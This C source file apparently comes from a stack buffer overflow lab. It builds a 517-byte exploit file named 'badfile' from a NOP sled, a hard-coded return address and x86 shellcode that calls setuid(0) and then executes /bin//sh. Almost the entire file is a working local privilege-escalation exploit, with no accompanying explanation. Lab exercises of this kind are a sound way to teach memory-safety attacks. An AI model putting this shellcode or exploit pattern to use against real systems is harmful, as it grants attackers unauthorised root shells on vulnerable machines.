#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"
    "\x31\xdb"
    "\xb0\xd5"
    "\xcd\x80"
    "\x31\xc0"             /* xorl    %eax,%eax     */
    "\x50"                 /* pushl   %eax          */
    "\x68""//sh"           /* pushl   $0x68732f2f   */
    "\x68""/bin"           /* pushl   $0x6e69622f   */
    "\x89\xe3"             /* movl    %esp,%ebx     */
    "\x50"                 /* pushl   %eax          */
    "\x53"                 /* pushl   %ebx          */
    "\x89\xe1"             /* movl    %esp,%ecx     */
    "\x99"                 /* cdq                   */
    "\xb0\x0b"             /* movb    $0x0b,%al     */
    "\xcd\x80"             /* int     $0x80         */
;

void main(int argc, char **argv)
{
  char buffer[517];
  FILE *badfile;

  /* A. Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 517);

  /* B. Fill the return address field with a candidate 
        entry point of the malicious code */
  *((long *) (buffer + 0x24)) = 0xbfffeb88 + 0x90;
    
  // C. Place the shellcode towards the end of buffer
  memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, 
         sizeof(shellcode));

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 517, 1, badfile);
  fclose(badfile);
}